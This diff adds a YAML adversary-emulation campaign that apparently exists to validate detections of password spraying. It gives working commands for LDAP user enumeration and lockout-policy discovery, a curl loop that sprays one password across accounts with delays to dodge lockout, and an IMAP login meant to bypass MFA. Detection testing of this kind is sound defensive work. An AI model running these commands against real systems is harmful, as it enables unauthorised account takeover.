@@ -1,0 +1,96 @@
+api_version: v1
+kind: Campaign
+
+meta:
+  name: credential-spray
+  adversary: apt33
+  description: "Password spraying campaign — low-and-slow credential testing across multiple accounts using common passwords to evade lockout thresholds."
+  objective: "Validate detection of distributed password spray patterns including timing analysis, account targeting breadth, and lockout evasion techniques."
+  mitre_version: "15.1"
+  severity: high
+  tags: [credential-access, password-spray, brute-force, lockout-evasion]
+  authors: ["ThreatEcho"]
+  created: "2024-09-22"
+  modified: "2025-04-10"
+
+variables:
+  target_endpoint: "https://login.corp.example.com/oauth2/token"
+  user_list: "./wordlists/domain_users.txt"
+  password: "Spring2025!"
+  spray_delay_seconds: "35"
+
+stages:
+  - id: user-enumeration
+    name: Active Directory User Enumeration
+    technique: T1087.002
+    tactic: discovery
+    description: "Enumerate valid domain user accounts via LDAP and OWA timing side-channel."
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          ldapsearch -x -H ldap://dc01.corp.example.com -b "dc=corp,dc=example,dc=com" \
+            "(objectClass=user)" sAMAccountName | grep sAMAccountName | awk '{print $2}' > /tmp/valid_users.txt
+    expect:
+      telemetry: [ldap_query, network_connection]
+      detections: [ldap_user_enumeration, bulk_directory_query, reconnaissance_activity]
+    on_failure: continue
+
+  - id: lockout-policy-recon
+    name: Lockout Policy Discovery
+    technique: T1201
+    tactic: discovery
+    description: "Discover account lockout thresholds and observation windows to calibrate spray timing."
+    depends_on: [user-enumeration]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: "net accounts /domain"
+        executor: cmd
+    expect:
+      telemetry: [process_creation, command_line]
+      detections: [lockout_policy_enumeration, password_policy_discovery]
+    on_failure: continue
+
+  - id: password-spray-wave1
+    name: Password Spray Wave 1
+    technique: T1110.003
+    tactic: credential-access
+    description: "Spray a single common password across all enumerated accounts with inter-attempt delays to stay under lockout."
+    depends_on: [lockout-policy-recon]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          while IFS= read -r user; do
+            curl -s -o /dev/null -w "%{http_code}" -X POST "{{target_endpoint}}" \
+              -d "grant_type=password&username=${user}@corp.example.com&password={{password}}&client_id=app-client" \
+              >> /tmp/spray_results.txt
+            echo " ${user}" >> /tmp/spray_results.txt
+            sleep {{spray_delay_seconds}}
+          done < /tmp/valid_users.txt
+    expect:
+      telemetry: [authentication_event, logon_failure_4625, network_connection]
+      detections: [password_spray_detected, distributed_auth_failures, single_password_multi_account]
+    on_failure: continue
+
+  - id: mfa-bypass-check
+    name: MFA Bypass via Legacy Protocol
+    technique: T1078.004
+    tactic: credential-access
+    description: "Attempt to authenticate valid credentials via legacy protocols (IMAP/POP3/SMTP) that may bypass MFA."
+    depends_on: [password-spray-wave1]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          curl -s --connect-timeout 10 -u "svc_reports@corp.example.com:{{password}}" \
+            imaps://mail.corp.example.com/INBOX -o /dev/null -w "%{http_code}"
+    expect:
+      telemetry: [authentication_event, legacy_protocol_auth]
+      detections: [legacy_protocol_auth_attempt, mfa_bypass_via_basic_auth, imap_brute_force]
+    on_failure: continue
